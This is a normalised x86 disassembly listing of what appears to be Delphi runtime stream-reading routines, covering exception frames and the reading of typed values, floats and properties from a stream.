mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43c464
call sub_44c070
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
sub_43ffcc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43ea80
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_43fff8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_440034
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_440080
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_440080
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
sub_4400d4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al 0x9
sete [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_4400f4
push ebp
mov ebp esp
add esp 0xfffffff4
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44016d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x6
mov eax [ ebp - 0x4 ]
call sub_43fb3c
lea edx [ ebp - 0x5 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_440034
mov al [ ebp - 0x5 ]
cmp al 0x1
je r-xdata
lea edx [ ebp - 0x5 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_440034
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440174
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_441834
call sub_43faa0
sub_44017c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_440228
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43fc8c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_43d20c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fff8
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebp - 0x4 ]
call sub_440b44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44022f
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x8 ]
call sub_43d1c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_440b30
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440a78
mov eax [ ebp - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_440cd0
mov eax [ ebp - 0x4 ]
call sub_440b44
sub_440234
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
test [ eax - 0x1 ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop ecx
pop ebp
retn
mov al 0x1
sub_44025c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
call sub_447768
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_440234
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
xor edx edx
call sub_441c90
call sub_447768
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44c070
sub_4402c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4403b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_441e78
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or [ eax + 0x20 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x1 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_440386
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or [ eax + 0x20 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or [ eax + 0x20 ] 0x200
sub_4403b7
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
call sub_44025c
pop ecx
test al al
jne r-xdata
call sub_44c818
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_44c7c4
sub_4403dc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_440452
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov bx 0xfff9
call sub_44c24c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
call [ rw-data ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x10 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
or [ eax + 0x20 ] 0x200
sub_440457
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
call sub_44025c
pop ecx
test al al
jne r-xdata
call sub_44c818
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_44c7c4
sub_44047c
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4404fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_441e78
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov bx 0xfff3
call sub_44c24c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov [ edx + 0x2c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x2c ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4404ff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
call sub_44025c
pop ecx
test al al
jne r-xdata
call sub_44c818
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_44c7c4
sub_440524
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4406e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x1 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_441834
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_441834
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_4406c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x1 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_440685
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
or [ eax + 0x20 ] 0x1
test [ ebp - 0x1 ] 0x1
jne r-xdata
push ebp
call sub_4402c8
pop ecx
push ebp
call sub_44047c
pop ecx
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push ebp
call sub_4403dc
pop ecx
mov eax [ ebp - 0x10 ]
test [ eax + 0x21 ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_44c848
jmp r-xdata
mov eax [ ebp - 0x10 ]
or [ eax + 0x20 ] 0x2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x20 ] 0xfffd
test [ ebp - 0x1 ] 0x2
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_44cb04
retn
test [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov bx 0xfffa
call sub_44c24c
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_43c504
test eax eax
jge r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x21 ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_43c264
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_43c264
sub_44068a
push ebp
call sub_440234
pop ecx
test al al
je r-xdata
call sub_44c7c4
call sub_44c818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x10 ]
call sub_44c070
sub_4406fc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_440770
pop ecx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_44075a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_440770
mov eax [ ebp - 0x4 ]
call sub_43fdfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ff6c
retn
sub_440770
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_440cd0
mov eax [ ebp - 0x4 ]
call sub_440b44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov bx 0xfffb
call sub_44c24c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_440837
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov bx 0xfffc
call sub_44c24c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_440524
mov eax [ ebp - 0x4 ]
call sub_440b44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44083e
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
sub_440844
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al 0x5
jne r-xdata
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_440a78
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x10 ]
fwait
lea edx [ ebp - 0x10 ]
mov ecx 0xa
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
fld [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_44088c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al 0xf
jne r-xdata
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_440a78
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4408d4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_440a78
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ r-xdata ]
fistp [ ebp - 0x10 ]
fwait
lea edx [ ebp - 0x10 ]
mov ecx 0x8
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
fild [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_440924
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al 0x11
jne r-xdata
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_440a78
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x10 ]
fwait
lea edx [ ebp - 0x10 ]
mov ecx 0x8
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
fld [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_44096c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_43faa0
mov al [ eax + lookup_table_440999 ]
jmp [ eax * 4 + jump_table_4409a7 ]
lea edx [ ebp - 0x9 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_440034
xor ecx ecx
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_44cbc8
mov eax [ ebp - 0x8 ]
call sub_44cf30
mov edx eax
xor ecx ecx
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cb34
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cb34
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cb34
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cb34
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_440a78
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
sub al 0x2
je r-xdata
lea edx [ ebp - 0x9 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_440034
movsx eax [ ebp - 0x9 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xc ]
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_440034
movsx eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
jmp r-xdata
call sub_43faa0
sub_440ae8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43fff8
cmp al 0x13
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_440a78
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_441940
lea edx [ ebp - 0x10 ]
mov ecx 0x8
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_440b58
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov dl [ r-xdata ]
mov [ eax ] dl
mov eax [ ebp - 0x4 ]
call sub_43fff8
and al 0xf0
cmp al 0xf0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_441940
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
and al 0xf
mov edx [ ebp - 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x8 ]
test [ eax ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440a78
mov edx [ ebp - 0xc ]
mov [ edx ] eax
sub_440bb1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffed8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440ca8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_44cae0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_44cb78
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x124 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x120 ] eax
mov [ ebp - 0x11c ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x118 ] eax
mov [ ebp - 0x114 ] 0xb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x110 ] eax
mov [ ebp - 0x10c ] 0xb
lea eax [ ebp - 0x128 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440caf
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_44cd04
sub_440cd0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440ec2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_44c5e8#4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_441834
xor eax eax
push ebp
push j_sub_44c5e8#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x8 ]
call sub_44cd60
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x74 ] 0x1
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_44cf68
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
cmp [ eax + edx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
call sub_44c290
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4051fc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
call sub_44c290
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4051fc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x74 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x74 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_441160
jmp r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_44001c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44001c
mov eax [ ebp - 0x24 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
call sub_405268
mov [ ebp - 0x24 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
push ebp
call sub_440cb4
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440ec9
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
sub_440ed0
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_43bda4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call sub_43faa0
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x14 ]
test al al
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4052dc
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_440f1c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
